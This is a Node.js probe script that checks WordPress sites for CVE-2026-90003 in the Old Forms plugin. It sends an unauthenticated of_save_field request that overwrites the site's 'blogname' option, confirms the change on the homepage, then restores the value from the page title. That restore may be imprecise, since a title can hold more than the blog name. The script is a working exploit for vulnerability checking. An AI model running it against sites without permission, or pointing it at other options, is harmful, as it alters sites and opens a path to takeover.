#!/usr/bin/env node
// Exploit-verification probe for CVE-2026-90003 (Old Forms <= 1.4.2
// unauthenticated arbitrary options update via the of_save_field AJAX action).
//
// Usage: node probe.mjs <base-url>
//
// Exit code 0 -> target is vulnerable (unauthenticated of_save_field write succeeded).
// Exit code 1 -> target is NOT vulnerable (write rejected / did not take effect).
//
// The probe writes the "blogname" option (which is safely readable via the
// public homepage's <title> tag, making the write independently verifiable
// without any admin credentials) to a unique marker value, confirms the
// change is reflected on the live site, and then restores the original
// blogname value it read before the test.

const baseUrl = process.argv[2];

if (!baseUrl) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

const base = baseUrl.replace(/\/+$/, '');
const ajaxUrl = `${base}/wp-admin/admin-ajax.php`;
const homeUrl = `${base}/`;

function extractTitle(html) {
  const m = /<title>([\s\S]*?)<\/title>/i.exec(html);
  return m ? m[1] : null;
}

async function getHomeTitle() {
  const res = await fetch(homeUrl, { method: 'GET' });
  const html = await res.text();
  return extractTitle(html);
}

async function saveField(key, value) {
  const body = new URLSearchParams({
    action: 'of_save_field',
    key,
    value,
  });
  const res = await fetch(ajaxUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: body.toString(),
  });
  let json = null;
  try {
    json = await res.json();
  } catch {
    // non-JSON response; treated as failure by caller
  }
  return { status: res.status, json };
}

async function main() {
  let originalTitle = null;
  try {
    originalTitle = await getHomeTitle();
  } catch (err) {
    console.error('Failed to fetch homepage:', err.message);
    process.exit(1);
  }

  if (originalTitle === null) {
    console.error('Could not find a <title> tag on the homepage; cannot verify option writes this way.');
    process.exit(1);
  }

  const marker = `OF_PROBE_${Date.now()}_${Math.random().toString(36).slice(2)}`;

  let vulnerable = false;
  let writeSucceeded = false;

  try {
    const { status, json } = await saveField('blogname', marker);
    if (status === 200 && json && json.success === true) {
      writeSucceeded = true;
    }
  } catch (err) {
    console.error('Request to of_save_field failed:', err.message);
  }

  if (writeSucceeded) {
    try {
      const newTitle = await getHomeTitle();
      if (newTitle !== null && newTitle.includes(marker)) {
        vulnerable = true;
      }
    } catch (err) {
      console.error('Failed to fetch homepage for verification:', err.message);
    }
  }

  // Attempt to restore the original state regardless of outcome.
  try {
    await saveField('blogname', originalTitle);
  } catch {
    // best-effort restoration; do not let this affect the exit code
  }

  if (vulnerable) {
    console.log(
      `VULNERABLE: unauthenticated of_save_field request updated the "blogname" option ` +
        `to "${marker}" and it was reflected on the public homepage. ` +
        `(CVE-2026-90003 - missing capability check in Old Forms <= 1.4.2)`
    );
    process.exit(0);
  } else {
    console.log(
      'NOT VULNERABLE: the of_save_field AJAX action did not allow an unauthenticated ' +
        'arbitrary option update (write rejected or not reflected on the site).'
    );
    process.exit(1);
  }
}

main();
